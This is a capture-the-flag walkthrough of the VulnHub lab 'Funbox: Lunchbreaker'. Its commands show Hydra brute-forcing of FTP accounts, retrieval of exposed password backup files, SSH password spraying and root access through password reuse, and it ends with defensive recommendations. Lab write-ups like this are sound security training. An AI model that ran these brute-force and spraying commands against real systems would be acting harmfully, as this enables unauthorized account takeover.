# Funbox: Lunchbreaker (VulnHub)

## Overview

**Funbox: Lunchbreaker** is an Easy-level VulnHub machine that demonstrates the dangers of weak credential management, anonymous FTP access, password brute-forcing, exposed backup files, password spraying, and password reuse. The machine showcases how multiple low-risk misconfigurations can be chained together to gain complete system compromise.

This lab provides practical experience in reconnaissance, FTP enumeration, web enumeration, Hydra password attacks, SSH password spraying, Linux enumeration, and privilege escalation through root password reuse.

---

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Funbox: Lunchbreaker |
| Platform | VulnHub |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Main Vector | Anonymous FTP → Weak Credentials → Backup Password Files → SSH Password Spraying → Root Password Reuse |
| Objective | Gain Root Access and Retrieve the Root Flag |

---

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- FTP Enumeration
- Anonymous FTP Access
- Web Enumeration
- Source Code Inspection
- Username Enumeration
- Password Brute Force
- Hydra
- Password Spraying
- SSH Enumeration
- Linux Enumeration
- Credential Harvesting
- Privilege Escalation
- Post Exploitation

---

## Tools Used

- Netdiscover
- Nmap
- Hydra
- FTP
- SSH
- Linux Commands
- Kali Linux

---

## Attack Methodology

1. Discover the target machine.
2. Enumerate open services.
3. Identify anonymous FTP access.
4. Enumerate usernames from the web page source.
5. Brute-force multiple FTP accounts.
6. Enumerate user home directories.
7. Access exposed password backup files.
8. Perform SSH password spraying.
9. Obtain SSH access.
10. Enumerate local files.
11. Discover root password reuse.
12. Escalate privileges.
13. Retrieve the root flag.

---

## Network Discovery

Identify the target machine.

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.22
```

The vulnerable machine was successfully identified on the local network.

---

## Service Enumeration

Run an Nmap scan.

```bash
sudo nmap -sC -sV -Pn 192.168.10.22 --min-rate 10000
```

### Open Ports

| Port | Service | Version |
|------|----------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

### Important Findings

- Anonymous FTP enabled
- SSH service available
- Apache web server running

---

## Web Enumeration

Visit the website and inspect the page source.

Discovered username:

```text
jane
```

This provided a valid username for further enumeration.

---

## Brute-Forcing FTP Credentials (Jane)

Use Hydra.

```bash
hydra -l jane -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.22
```

Recovered credentials:

```text
Username: jane
Password: password
```

---

## FTP Enumeration (Jane)

Login using Jane's credentials.

```bash
ftp 192.168.10.22
```

Enumerate directories.

```bash
dir
cd /home
dir
```

Discovered users:

```text
jane
jim
john
jules
```

---

## Brute-Forcing FTP Credentials (Jim)

```bash
hydra -l jim -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.22
```

Recovered credentials:

```text
Username: jim
Password: 12345
```

---

## FTP Enumeration (Jim)

Login.

```bash
ftp 192.168.10.22
```

Inspect files.

```bash
ls -la
cd .ssh
ls -la
```

Interesting files:

```text
authorized_keys
id_rsa
```

Both files were empty.

---

## Brute-Forcing FTP Credentials (Jules)

```bash
hydra -l jules -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.22
```

Recovered credentials:

```text
Username: jules
Password: sexylady
```

---

## FTP Enumeration (Jules)

Login.

```bash
ftp 192.168.10.22
```

Navigate to the backup directory.

```bash
ls -la
cd .backups
ls -la
```

Interesting files:

```text
.bad-passwds
.good-passwd
.forbidden-passwds
.very-bad-passwds
```

Download useful password lists.

```bash
get .bad-passwds
get .good-passwd
```

---

## SSH Password Spraying

First attempt using the good password list.

```bash
hydra -l john -P .good-passwd ssh://192.168.10.22
```

No valid credentials were found.

Try again using the bad password list.

```bash
hydra -l john -P .bad-passwds ssh://192.168.10.22
```

Recovered credentials:

```text
Username: john
Password: zhnmju!!!
```

---

## Initial Access

Login via SSH.

```bash
ssh john@192.168.10.22
```

Verify access.

```bash
whoami
```

Output:

```text
john
```

---

## Local Enumeration

Inspect the user's home directory.

```bash
ls -la
```

Interesting directory:

```text
.todo
```

Read the task list.

```bash
cd .todo
cat todo.list
```

Contents:

```text
1. Install LAMP
2. Install MAIL-System
3. Install Firewall
4. Install Plesk
5. Change ROOTPASSWD, because it's the same right now.
```

This reveals that the root password is identical to John's password.

---

## Privilege Escalation

Switch to the root account.

```bash
su root
```

Password:

```text
zhnmju!!!
```

Verify.

```bash
whoami
```

Output:

```text
root
```

Root privileges successfully obtained.

---

## Root Flag

Navigate to the root directory.

```bash
cd /root
```

Read the flag.

```bash
cat root.flag
```

Root flag successfully captured.

---

## Vulnerabilities Identified

### 1. Anonymous FTP Enabled

Anonymous authentication exposed the FTP service.

### 2. Weak FTP Passwords

Multiple user accounts used easily guessable passwords.

### 3. Username Enumeration

Valid usernames were disclosed through the website source and FTP directory structure.

### 4. Exposed Backup Password Files

Sensitive password lists were accessible through FTP.

### 5. Password Spraying

SSH credentials were successfully obtained using exposed password files.

### 6. Root Password Reuse

The root account reused the same password as a standard user, allowing immediate privilege escalation.

---

## Attack Chain Summary

- Network Discovery using Netdiscover
- Service Enumeration using Nmap
- Anonymous FTP Access
- Username Enumeration
- FTP Password Brute Force
- Multiple FTP Account Enumeration
- Backup Password File Discovery
- SSH Password Spraying
- SSH Access as John
- Local Enumeration
- Root Password Reuse Discovery
- Privilege Escalation
- Root Flag Retrieval

---

## Security Recommendations

- Disable anonymous FTP access.
- Enforce strong password policies.
- Prevent password reuse across accounts.
- Remove exposed backup password files.
- Restrict directory permissions.
- Enable account lockout after repeated authentication failures.
- Implement MFA for SSH access.
- Regularly audit credentials and permissions.
- Monitor authentication logs for brute-force attacks.
- Apply the principle of least privilege.

---

## Key Learning Outcomes

- Anonymous FTP services expose valuable attack surfaces.
- Source code inspection can reveal valid usernames.
- Weak passwords remain a major security risk.
- Password backup files should never be publicly accessible.
- Password spraying is effective when password reuse exists.
- Local enumeration often uncovers privilege escalation opportunities.
- Root password reuse can completely compromise a system.

---

## Conclusion

Funbox: Lunchbreaker is an excellent beginner-friendly VulnHub machine that demonstrates how poor credential management can lead to complete system compromise. The machine combines FTP enumeration, password brute-forcing, credential harvesting, SSH password spraying, Linux enumeration, and privilege escalation, reinforcing the importance of secure password policies, access control, and credential management.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
